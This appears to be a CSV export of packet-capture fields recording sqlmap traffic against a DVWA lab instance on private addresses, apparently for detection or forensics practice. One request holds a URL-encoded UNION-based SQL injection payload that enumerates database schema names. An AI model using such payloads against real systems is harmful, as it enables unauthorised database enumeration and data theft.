frame.time,ip.src,tcp.srcport,ip.dst,tcp.dstport,http.request.method,http.request.uri,http.request.version,http.user_agent,http.host,http.response.version,http.response.code,http.response.phrase,http.content_length
Aug 28\, 2025 15:20:54.141969496 WIB,192.168.19.129,39106,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.170821322 WIB,192.168.19.128,80,192.168.19.129,39106,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:00.980097259 WIB,192.168.19.129,39132,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:01.001907706 WIB,192.168.19.128,80,192.168.19.129,39132,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:01.042810491 WIB,192.168.19.129,39144,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:01.067310371 WIB,192.168.19.128,80,192.168.19.129,39144,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:07.331728716 WIB,192.168.19.129,37670,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.360229392 WIB,192.168.19.128,80,192.168.19.129,37670,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:07.399462430 WIB,192.168.19.129,37684,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.429534115 WIB,192.168.19.128,80,192.168.19.129,37684,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:07.558349896 WIB,192.168.19.129,37696,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28schema_name%2F%2A%2A%2FAS%2F%2A%2A%2FNCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%2F%2A%2A%2FFROM%2F%2A%2A%2FINFORMATION_SCHEMA.SCHEMATA%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.578334138 WIB,192.168.19.128,80,192.168.19.129,37696,,/dvwa/vulnerabilities/sqli/?id=1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28schema_name%2F%2A%2A%2FAS%2F%2A%2A%2FNCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%2F%2A%2A%2FFROM%2F%2A%2A%2FINFORMATION_SCHEMA.SCHEMATA%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:07.593102643 WIB,192.168.19.129,37702,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.621196110 WIB,192.168.19.128,80,192.168.19.129,37702,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
